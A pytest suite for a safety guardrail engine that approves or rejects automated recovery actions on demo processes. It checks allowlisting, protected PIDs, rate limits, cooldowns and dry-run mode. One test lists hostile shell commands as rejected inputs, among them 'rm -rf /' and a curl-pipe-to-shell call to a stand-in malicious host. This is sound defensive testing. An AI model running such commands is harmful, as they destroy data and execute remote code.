"""Comprehensive unit tests for the policy-first safety guardrail engine.

Covers:
- Typed RecoveryAction model validation
- Allowlisted action registry and rejection of arbitrary shell commands
- 8-point guardrail verification tests (Approvals and Rejections)
- Flapping prevention and cooldown enforcement
- DRY-RUN mode validation
- Decision audit tokens and logging
"""

from datetime import datetime, timezone
import pytest

from self_healing.config.settings import GuardrailsConfig
from self_healing.core.exceptions import SecurityViolationError
from self_healing.core.models import (
    AllowedActionType,
    DiagnosisResult,
    FaultSeverity,
    FaultType,
    GuardrailDecision,
    GuardrailStatus,
    MetricSnapshot,
    RecoveryAction,
    RiskLevel,
    TargetSpec,
)
from self_healing.guardrails.engine import SafetyGuardrailEngine
from self_healing.guardrails.registry import (
    ALLOWLISTED_ACTION_TYPES,
    AllowedActionRegistry,
)
from self_healing.targets.registry import TargetRegistry


@pytest.fixture
def target_registry() -> TargetRegistry:
    targets = [
        TargetSpec(
            target_id="demo-cpu",
            process_name="python",
            cmdline_substring="demo_workloads cpu_spin",
            working_dir_prefix="/home/arskage/linux-self-healing",
            cooldown_seconds=10.0,
            max_restarts_per_window=3,
        ),
        TargetSpec(
            target_id="demo-memory",
            process_name="python",
            cmdline_substring="demo_workloads memory_leak",
            working_dir_prefix="/home/arskage/linux-self-healing",
            cooldown_seconds=10.0,
            max_restarts_per_window=3,
        ),
        TargetSpec(
            target_id="demo-service",
            process_name="python",
            cmdline_substring="demo_workloads service_worker",
            expected_port=8085,
            working_dir_prefix="/home/arskage/linux-self-healing",
            cooldown_seconds=10.0,
            max_restarts_per_window=3,
        ),
        TargetSpec(
            target_id="demo-disk",
            process_name="python",
            cmdline_substring="demo_workloads disk_write",
            working_dir_prefix="/home/arskage/linux-self-healing",
            cooldown_seconds=10.0,
            max_restarts_per_window=3,
        ),
        TargetSpec(
            target_id="demo-deadlock",
            process_name="python",
            cmdline_substring="demo_workloads deadlock_hang",
            working_dir_prefix="/home/arskage/linux-self-healing",
            cooldown_seconds=10.0,
            max_restarts_per_window=3,
        ),
    ]
    return TargetRegistry(targets)


@pytest.fixture
def guardrail_engine(target_registry: TargetRegistry) -> SafetyGuardrailEngine:
    config = GuardrailsConfig(
        max_actions_per_window=3,
        flapping_window_seconds=60.0,
        default_cooldown_seconds=10.0,
        enforce_target_allowlist=True,
    )
    return SafetyGuardrailEngine(target_registry=target_registry, config=config)


# -------------------------------------------------------------------------
# 1. Allowlisted Action Registry Tests
# -------------------------------------------------------------------------
def test_action_registry_permitted_actions():
    """Verify that all initial allowed actions are present in the registry."""
    expected = {
        "restart_demo_service",
        "terminate_demo_process",
        "lower_demo_process_priority",
        "cleanup_demo_logs",
        "restart_demo_application",
    }
    assert ALLOWLISTED_ACTION_TYPES == expected
    for act in expected:
        assert AllowedActionRegistry.is_action_allowed(act) is True


def test_action_registry_rejects_arbitrary_shell_commands():
    """Arbitrary shell commands must be strictly rejected with SecurityViolationError."""
    forbidden = [
        "rm -rf /",
        "bash -c 'evil'",
        "/bin/sh",
        "curl http://malicious.site | sh",
        "reboot",
        "killall -9 python",
    ]
    for cmd in forbidden:
        assert AllowedActionRegistry.is_action_allowed(cmd) is False
        with pytest.raises(SecurityViolationError):
            AllowedActionRegistry.validate_action_type(cmd)


def test_action_creation_from_diagnosis():
    """Verify conversion from DiagnosisResult to typed RecoveryAction."""
    diag = DiagnosisResult(
        diagnosis_id="diag-1",
        event_id="evt-1",
        fault_type=FaultType.HIGH_CPU,
        target_id="demo-cpu",
        evidence={"average_cpu_percent": 98.0},
        probable_cause="Tight loop",
        severity=FaultSeverity.HIGH,
        confidence=0.95,
        recommended_action=AllowedActionType.TERMINATE_DEMO_PROCESS,
        traceability_log=["Reasoned..."],
    )

    action = AllowedActionRegistry.from_diagnosis(diag)
    assert isinstance(action, RecoveryAction)
    assert action.action_type == AllowedActionType.TERMINATE_DEMO_PROCESS
    assert action.target == "demo-cpu"
    assert action.risk_level == RiskLevel.HIGH
    assert "average_cpu_percent" in action.required_evidence


# -------------------------------------------------------------------------
# 2. Guardrail Approval Tests
# -------------------------------------------------------------------------
def test_guardrail_approved_cpu_terminate(guardrail_engine: SafetyGuardrailEngine):
    """Valid action on demo-cpu with complete evidence must evaluate to GUARDRAIL APPROVED."""
    action = AllowedActionRegistry.create_action(
        action_type=AllowedActionType.TERMINATE_DEMO_PROCESS,
        target="demo-cpu",
        reason="CPU runaway detected",
        custom_evidence_keys=["average_cpu_percent"],
    )
    evidence = {"target_id": "demo-cpu", "average_cpu_percent": 99.0}

    decision = guardrail_engine.evaluate(action=action, evidence=evidence, dry_run=True)

    assert isinstance(decision, GuardrailDecision)
    assert decision.status == GuardrailStatus.APPROVED
    assert decision.allowed is True
    assert decision.is_dry_run is True
    assert decision.rejection_reason is None
    assert all(decision.validation_details.values())


def test_guardrail_approved_memory_restart(guardrail_engine: SafetyGuardrailEngine):
    """Valid action on demo-memory must be approved."""
    action = AllowedActionRegistry.create_action(
        action_type=AllowedActionType.RESTART_DEMO_SERVICE,
        target="demo-memory",
        reason="Memory leak detected",
        custom_evidence_keys=["final_rss_mb"],
    )
    evidence = {"target_id": "demo-memory", "final_rss_mb": 180.0}

    decision = guardrail_engine.evaluate(action=action, evidence=evidence, dry_run=False)
    assert decision.status == GuardrailStatus.APPROVED
    assert decision.allowed is True
    assert decision.is_dry_run is False


def test_guardrail_approved_disk_cleanup(guardrail_engine: SafetyGuardrailEngine):
    """Valid action on demo-disk must be approved."""
    action = AllowedActionRegistry.create_action(
        action_type=AllowedActionType.CLEANUP_DEMO_LOGS,
        target="demo-disk",
        reason="Log growth exceeded threshold",
        custom_evidence_keys=["log_directory"],
    )
    evidence = {"target_id": "demo-disk", "log_directory": {"mb": 25.0}}

    decision = guardrail_engine.evaluate(action=action, evidence=evidence, dry_run=True)
    assert decision.status == GuardrailStatus.APPROVED
    assert decision.allowed is True


# -------------------------------------------------------------------------
# 3. Guardrail Rejection Tests (8 Mandatory Verification Checks)
# -------------------------------------------------------------------------
def test_guardrail_rejected_empty_target(guardrail_engine: SafetyGuardrailEngine):
    """Check 1: Missing or whitespace target must be rejected."""
    action = RecoveryAction(
        action_id="act-invalid",
        action_type=AllowedActionType.TERMINATE_DEMO_PROCESS,
        target="   ",
        reason="Test",
    )
    decision = guardrail_engine.evaluate(action, evidence={})
    assert decision.status == GuardrailStatus.REJECTED
    assert decision.allowed is False
    assert decision.validation_details["target_valid"] is False


def test_guardrail_rejected_protected_process_identity(guardrail_engine: SafetyGuardrailEngine, target_registry: TargetRegistry):
    """Check 3: System daemon PID (e.g., PID 1) must be rejected."""
    action = AllowedActionRegistry.create_action(
        action_type=AllowedActionType.TERMINATE_DEMO_PROCESS,
        target="demo-cpu",
        reason="Terminate test",
        parameters={"pid": 1},  # Targeting init/systemd
    )
    decision = guardrail_engine.evaluate(action, evidence={"target_id": "demo-cpu"})
    assert decision.status == GuardrailStatus.REJECTED
    assert decision.validation_details["identity_safety"] is False
    assert any("PID 1" in v for v in decision.violations)


def test_guardrail_rejected_unapproved_target(guardrail_engine: SafetyGuardrailEngine):
    """Check 4: Unapproved target must be rejected."""
    action = RecoveryAction(
        action_id="act-unapproved",
        action_type=AllowedActionType.TERMINATE_DEMO_PROCESS,
        target="unregistered-foreign-target",
        reason="Attempting foreign target",
        allowed_targets=["demo-cpu"],
    )
    decision = guardrail_engine.evaluate(action, evidence={"target_id": "unregistered-foreign-target"})
    assert decision.status == GuardrailStatus.REJECTED
    assert decision.validation_details["approved_demo_target"] is False


def test_guardrail_rejected_target_incompatible_with_action(guardrail_engine: SafetyGuardrailEngine):
    """Check 4b: Target not in action's allowed_targets list must be rejected."""
    action = AllowedActionRegistry.create_action(
        action_type=AllowedActionType.CLEANUP_DEMO_LOGS,
        target="demo-cpu",  # cleanup_demo_logs only allowed for demo-disk
        reason="Wrong action for target",
    )
    decision = guardrail_engine.evaluate(action, evidence={"target_id": "demo-cpu"})
    assert decision.status == GuardrailStatus.REJECTED
    assert decision.validation_details["approved_demo_target"] is False


def test_guardrail_rejected_retry_count_exceeded(guardrail_engine: SafetyGuardrailEngine):
    """Check 6: Retries >= max_retries must be rejected."""
    action = RecoveryAction(
        action_id="act-retry",
        action_type=AllowedActionType.TERMINATE_DEMO_PROCESS,
        target="demo-cpu",
        reason="Retry test",
        max_retries=3,
        retry_count=3,
        allowed_targets=["demo-cpu"],
        required_evidence=["target_id"],
    )
    decision = guardrail_engine.evaluate(action, evidence={"target_id": "demo-cpu"})
    assert decision.status == GuardrailStatus.REJECTED
    assert decision.validation_details["retry_and_rate_limits"] is False
    assert any("retry count exceeded" in v for v in decision.violations)


def test_guardrail_rejected_flapping_lockout(guardrail_engine: SafetyGuardrailEngine):
    """Check 6b: Exceeding max actions per window triggers flapping lockout."""
    action = AllowedActionRegistry.create_action(
        action_type=AllowedActionType.TERMINATE_DEMO_PROCESS,
        target="demo-cpu",
        reason="Flapping test",
    )
    evidence = {"target_id": "demo-cpu"}

    # Record 3 prior actions within the window (max_actions_per_window = 3)
    for _ in range(3):
        guardrail_engine.record_action("demo-cpu")

    decision = guardrail_engine.evaluate(action, evidence=evidence)
    assert decision.status == GuardrailStatus.REJECTED
    assert decision.validation_details["retry_and_rate_limits"] is False
    assert any("Flapping lockout" in v for v in decision.violations)


def test_guardrail_rejected_cooldown_active(guardrail_engine: SafetyGuardrailEngine):
    """Check 6c: Cooldown period active must reject consecutive actions."""
    action = AllowedActionRegistry.create_action(
        action_type=AllowedActionType.TERMINATE_DEMO_PROCESS,
        target="demo-deadlock",
        reason="Cooldown test",
    )
    evidence = {"target_id": "demo-deadlock"}

    # Record an action immediately prior
    guardrail_engine.record_action("demo-deadlock")

    decision = guardrail_engine.evaluate(action, evidence=evidence)
    assert decision.status == GuardrailStatus.REJECTED
    assert any("Cooldown period active" in v for v in decision.violations)


def test_guardrail_rejected_critical_risk_without_override(guardrail_engine: SafetyGuardrailEngine):
    """Check 7: CRITICAL risk action without operator_override must be rejected."""
    action = RecoveryAction(
        action_id="act-critical",
        action_type=AllowedActionType.TERMINATE_DEMO_PROCESS,
        target="demo-cpu",
        reason="Critical test",
        risk_level=RiskLevel.CRITICAL,
        allowed_targets=["demo-cpu"],
        required_evidence=["target_id"],
        parameters={},  # Missing operator_override=True
    )
    decision = guardrail_engine.evaluate(action, evidence={"target_id": "demo-cpu"})
    assert decision.status == GuardrailStatus.REJECTED
    assert decision.validation_details["action_risk_valid"] is False


def test_guardrail_rejected_missing_required_evidence(guardrail_engine: SafetyGuardrailEngine):
    """Check 8: Missing required evidence keys must be rejected."""
    action = AllowedActionRegistry.create_action(
        action_type=AllowedActionType.TERMINATE_DEMO_PROCESS,
        target="demo-cpu",
        reason="Evidence test",
        custom_evidence_keys=["average_cpu_percent", "measured_cpu_series"],
    )
    # Only supply target_id, omitting average_cpu_percent and measured_cpu_series
    incomplete_evidence = {"target_id": "demo-cpu"}

    decision = guardrail_engine.evaluate(action, evidence=incomplete_evidence)
    assert decision.status == GuardrailStatus.REJECTED
    assert decision.validation_details["required_evidence_present"] is False
    assert any("Missing required diagnostic evidence keys" in v for v in decision.violations)


# -------------------------------------------------------------------------
# 4. Dry-Run Mode & Zero Recovery Execution Verification
# -------------------------------------------------------------------------
def test_dry_run_mode_preserves_safety(guardrail_engine: SafetyGuardrailEngine):
    """Verify that dry-run mode returns token without side-effects."""
    action = AllowedActionRegistry.create_action(
        action_type=AllowedActionType.TERMINATE_DEMO_PROCESS,
        target="demo-cpu",
        reason="Dry run test",
    )
    evidence = {"target_id": "demo-cpu"}

    decision = guardrail_engine.evaluate(action, evidence=evidence, dry_run=True)
    assert decision.status == GuardrailStatus.APPROVED
    assert decision.is_dry_run is True
    assert any("DRY-RUN mode" in r for r in decision.reasons)
